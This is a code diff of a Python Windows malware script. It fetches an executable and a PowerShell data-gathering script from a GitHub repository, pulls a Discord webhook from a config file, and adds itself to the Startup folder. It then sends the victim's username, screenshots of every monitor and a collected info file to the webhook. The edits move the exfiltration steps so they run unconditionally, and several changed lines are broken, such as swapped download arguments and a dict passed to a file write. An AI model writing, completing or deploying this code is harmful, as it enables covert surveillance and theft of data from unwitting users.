@@ -142,24 +142,24 @@ os.chdir(value)
 if not os.path.exists(f"{value}\\have_done.txt"):
     path1 = download("https://github.com/thompog/bob/raw/refs/heads/main/bomba.exe", "bomba.exe", "C:\\", "5089855E172C9DA4340FC5097E85C8B26EDBE0414CADD83660C775F298AE1FDC")
     path2 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1", "getdata.ps1", "C:\\", "8BC7BA0D901A3C6818C6408B52EB022D75C50110E68519D7BCDE9473094D1EE7")
-    path3 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/config.txt", "config.txt", "C:\\", "82F3F0920C5EC5DEAEDA5058D8314E800D8DE0881E2036F2C886279E6F21D808")
+    path3 = download("https://raw.githubusercontent.com/thompog/bob/refs/heads/main/config.txt", "C:\\", "config.txt", "82F3F0920C5EC5DEAEDA5058D8314E800D8DE0881E2036F2C886279E6F21D808")
 
     nfile = read_file("C:\\config.txt", remove="webhook = https://discord.com/api/webhooks/1487128618189717606/Jh4fhNACI4jLruL64J8wIfIdC_78LbQ1AJIQSp5lCtysEpOX7fJe8_ak6tUxT5A9C6HZ", remove1="address = 0.0.0.0", remove2="port = 9000", remove3="\n", remove4="url", remove5=" ", ramove6="=")
     os.remove("C:\\config.txt")
 
     with open("Public Data.json", "w") as f:
-        f.write('{"url": nfile, "dir": value}')
+        f.write({"url": nfile, "dir": value})
 
     with open("start_nnnnn.bat", "w") as f:
         f.write("@echo off" + "\n" + 'for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]::GetFolderPath(' + "'CommonStartup')" + '"`) do set startupPath=%%i' + "\n" + 'cd /d "%startupPath%"' + "\n" + f'echo start "" "{value}\main.py">big_starter.bat')
     
     start(f"{value}\\start_nnnnn.bat")
 
-    ngetdata = read_file("C:\\getdata.ps1", remove="$root = Split-Path -Parent $MyInvocation.MyCommand.Path", remove1='$ErrorActionPreference = "Continue"')
+    ngetdata = read_file("C:\\getdata.ps1", remove="$root = Split-Path -Parent $MyInvocation.MyCommand.Path")
     os.remove("C:\\getdata.ps1")
 
     with open("Send Public Data.ps1", "w") as f:
-        f.write('$ErrorActionPreference = "Continue"' + "\n" + f'$root = "{value}"' + "\n" + ngetdata)
+        f.write(f'$root = "{value}"' + "\n" + ngetdata)
 
     shutil.move("C:\\bomba.exe", f"{value}\\bomba.exe")
 
@@ -172,29 +172,27 @@ if not os.path.exists(f"{value}\\have_done.txt"):
     with open("have_done.txt", "w") as f:
         f.write("a")
 
-    win32api.InitiateSystemShutdown(bRebootAfterShutdown=True)
-else:
-    if os.path.exists(f"{value}\\done.txt"):
-        os.remove(f"{value}\\done.txt")
+if os.path.exists(f"{value}\\done.txt"):
+    os.remove(f"{value}\\done.txt")
 
-    start(f"{value}\\Send Public Data.ps1")
+start(f"{value}\\Send Public Data.ps1")
 
-    while not os.path.exists(f"{value}\\done.txt"):
-        time.sleep(5)
+while not os.path.exists(f"{value}\\done.txt"):
+    time.sleep(5)
     
-    url = read_file(f"{value}\\Public Data.json", remove="{", remove2="}", remove3='"url":', remove4=f'"dir": {value}', remove5=",", remove6=" ", remove7="\n")
+url = read_file(f"{value}\\Public Data.json", remove="{", remove2="}", remove3='"url":', remove4=f'"dir": {value}', remove5=",", remove6=" ", remove7="\n")
 
-    try:
-        username = getpass.getuser()
-    except OSError:
-        username = "cant find user"
+try:
+    username = getpass.getuser()
+except OSError:
+    username = "cant find user"
 
-    subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"got a user {username}"', "-user", f'"{username}"'])
+subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"got a user {username}"', "-user", f'"{username}"'])
 
-    capture = ScreenCapture()
-    monitors = capture.list_monitors()
-    for i in range(len(monitors)):
-        mama = capture.capture_monitor(i, f'monitor{i}.png')
-        subprocess.run([f'{value}\\bomba.exe', '-post', '-url', url, "-T", f'"heres photos..."', "-user", f'"{username}"', "-photo", f"{mama}"])
+capture = ScreenCapture()
+monitors = capture.list_monitors()
+for i in range(len(monitors)):
+    mama = capture.capture_monitor(i, f'monitor{i}.png')
+    subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, "-T", f'"heres photos..."', "-user", f'"{username}"', "-photo", f"{mama}"])
 
-    subprocess.run([f'{value}\\bomba.exe', '-post', '-url', url, '-json', '-path', f'{value}\info.json'])
+subprocess.run([f'{value}\bomba.exe', '-post', '-url', url, '-json', '-path', f'{value}\info.json'])
